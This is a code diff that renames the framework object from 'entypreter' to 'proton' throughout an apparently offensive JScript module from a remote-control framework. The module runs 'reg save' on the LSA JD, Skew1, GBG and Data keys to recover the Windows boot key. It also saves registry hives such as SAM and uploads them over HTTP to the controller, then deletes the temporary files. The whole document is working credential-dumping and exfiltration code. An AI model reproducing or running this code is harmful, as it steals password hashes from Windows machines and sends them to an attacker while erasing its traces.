@@ -1,24 +1,24 @@
 function GetSysKey()
 {
-    var jdpath = entypreter.file.getPath("~RPATH~\\42JD");
-    var skew1path = entypreter.file.getPath("~RPATH~\\42Skew1");
-    var gbgpath = entypreter.file.getPath("~RPATH~\\42GBG");
-    var datapath = entypreter.file.getPath("~RPATH~\\42Data");
+    var jdpath = proton.file.getPath("~RPATH~\\42JD");
+    var skew1path = proton.file.getPath("~RPATH~\\42Skew1");
+    var gbgpath = proton.file.getPath("~RPATH~\\42GBG");
+    var datapath = proton.file.getPath("~RPATH~\\42Data");
 
-    entypreter.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD" + " " + jdpath + " /y", false);
-    entypreter.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1" + " " + skew1path + " /y", false);
-    entypreter.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG" + " " + gbgpath + " /y", false);
-    entypreter.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data" + " " + datapath + " /y", false);
+    proton.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD" + " " + jdpath + " /y", false);
+    proton.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1" + " " + skew1path + " /y", false);
+    proton.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG" + " " + gbgpath + " /y", false);
+    proton.shell.run("reg save HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data" + " " + datapath + " /y", false);
 
-    var data = entypreter.file.readBinary(jdpath);
-    data += entypreter.file.readBinary(skew1path);
-    data += entypreter.file.readBinary(gbgpath);
-    data += entypreter.file.readBinary(datapath);
+    var data = proton.file.readBinary(jdpath);
+    data += proton.file.readBinary(skew1path);
+    data += proton.file.readBinary(gbgpath);
+    data += proton.file.readBinary(datapath);
 
     var headers = {};
     headers["Task"] = "SysKey";
 
-    if (entypreter.user.encoder != "936")
+    if (proton.user.encoder != "936")
     {
         data = data.replace(/\\/g, "\\\\");
         data = data.replace(/\0/g, "\\0");
@@ -26,28 +26,28 @@ function GetSysKey()
 
     try
     {
-        headers["encoder"] = entypreter.user.encoder();
+        headers["encoder"] = proton.user.encoder();
     }
     catch (e)
     {
         headers["encoder"] = "1252";
     }
 
-    entypreter.work.report(data, headers);
-    entypreter.file.deleteFile(jdpath);
-    entypreter.file.deleteFile(skew1path);
-    entypreter.file.deleteFile(gbgpath);
-    entypreter.file.deleteFile(datapath);
+    proton.work.report(data, headers);
+    proton.file.deleteFile(jdpath);
+    proton.file.deleteFile(skew1path);
+    proton.file.deleteFile(gbgpath);
+    proton.file.deleteFile(datapath);
 }
 
 function DumpHive(name, uuid)
 {
-    var path = entypreter.file.getPath("~RPATH~\\" + uuid);
+    var path = proton.file.getPath("~RPATH~\\" + uuid);
 
-    entypreter.shell.run("reg save HKLM\\" + name + " " + path + " /y", false);
+    proton.shell.run("reg save HKLM\\" + name + " " + path + " /y", false);
 
-    entypreter.http.upload(path, name, ~CERTUTIL~, "Task");
-    entypreter.file.deleteFile(path);
+    proton.http.upload(path, name, ~CERTUTIL~, "Task");
+    proton.file.deleteFile(path);
 }
 
 try
@@ -63,11 +63,11 @@ try
         GetSysKey();
     }
 
-    entypreter.work.report("Complete");
+    proton.work.report("Complete");
 }
 catch (e)
 {
-    entypreter.work.error(e);
+    proton.work.error(e);
 }
 
-entypreter.exit();
+proton.exit();
